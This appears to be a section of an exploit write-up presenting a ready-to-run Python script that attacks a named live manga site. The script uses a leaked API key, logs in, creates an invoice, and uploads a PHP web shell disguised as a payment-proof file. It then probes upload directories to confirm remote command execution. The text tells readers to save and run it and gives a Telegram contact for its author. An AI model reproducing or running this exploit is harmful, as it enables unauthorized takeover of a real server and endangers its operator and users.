##  Full Automation – Python Exploit Script

Save the following as rce_upload_exploit_fixed.py and run it (it automates steps 6.1–6.4).

#!/usr/bin/env python3
"""
MangaIndo RCE via Payment Proof Upload – Full Automation
Contact: https://t.me/nijxxzm
"""

import json
import requests
import sys
import time
from urllib.parse import urljoin

SETTINGS_FILE = "settings_dump.json"
BASE_URL = "https://mangaindo.sobatfile.my.id/api/v1/api.php"

TEST_EMAIL = "attacker@test.com"
TEST_PASS = "Attacker123!"
SHELL_CODE = "<?php system($_GET['cmd']); ?>"

HEADERS = {"Data-Agent": "Android Ebook App"}

def load_api_key():
    with open(SETTINGS_FILE, 'r') as f:
        data = json.load(f)
    return data['api_key']

def api_call(action, api_key, session_token=None, **params):
    url = f"{BASE_URL}?api_key={api_key}"
    data = {"action": action}
    if session_token:
        data["user_session_token"] = session_token
    data.update(params)
    resp = requests.post(url, headers=HEADERS, data=data)
    try:
        return resp.json()
    except:
        return {"raw": resp.text}

def login(email, password, api_key):
    result = api_call("user_login", api_key, email=email, password=password)
    if result.get('status') != 'success':
        raise Exception(f"Login error: {result}")
    return result['data']['session_token']

def create_invoice(token, api_key):
    result = api_call("[REDACTED]", api_key, token, amount="10.00")
    if result.get('status') != 'success':
        raise Exception(f"Invoice creation failed: {result}")
    return result['data']['invoice_no']

def upload_shell(token, api_key, invoice_no):
    url = f"{BASE_URL}?api_key={api_key}"
    files = {"proof": ("shell.php", SHELL_CODE, "application/php")}
    data = {"action": "upload_manual_payment_proof", "user_session_token": token, "invoice_no": invoice_no}
    resp = requests.post(url, headers=HEADERS, files=files, data=data)
    try:
        return resp.json()
    except:
        return {"raw": resp.text}

def check_shell_url(domain="mangaindo.sobatfile.my.id", shell_name="shell.php"):
    paths = ["/uploads/", "/proofs/", "/files/", "/invoices/", "/uploads/payment_proofs/", "/"]
    for path in paths:
        url = urljoin(f"https://{domain}",

f"{path}{shell_name}")
        test_url = f"{url}?cmd=id"
        try:
            resp = requests.get(test_url, timeout=5)
            if resp.status_code == 200 and "uid=" in resp.text:
                return url, resp.text
        except:
            pass
    return None, None

def main():
    print("[+] MangaIndo RCE Exploit (Full Chain)")
    print("[+] Contact: https://t.me/nijxxzm")
    try:
        api_key = load_api_key()
        print(f"[+] API Key loaded: {api_key[:8]}...")
    except Exception as e:
        print(f"[-] Could not load API key: {e}")
        sys.exit(1)

    try:
        token = login(TEST_EMAIL, TEST_PASS, api_key)
        print(f"[+] Logged in as {TEST_EMAIL} (token: {token[:8]}...)")
    except Exception as e:
        print(f"[-] Login failed: {e}")
        sys.exit(1)

    try:
        invoice = create_invoice(token, api_key)
        print(f"[+] Created invoice: {invoice}")
    except Exception as e:
        print(f"[-] Invoice creation failed: {e}")
        sys.exit(1)

    print("[+] Uploading shell.php ...")
    result = upload_shell(token, api_key, invoice)
    print(f"[+] Upload response: {result}")

    print("[+] Searching for shell...")
    url, output = check_shell_url()
    if url:
        print(f"[+] SHELL FOUND at {url}?cmd=whoami")
        print(f"[+] Command output: {output.strip()}")
    else:
        print("[!] Shell not found in common paths. Try manually.")

if __name__ == "__main__":
    main()

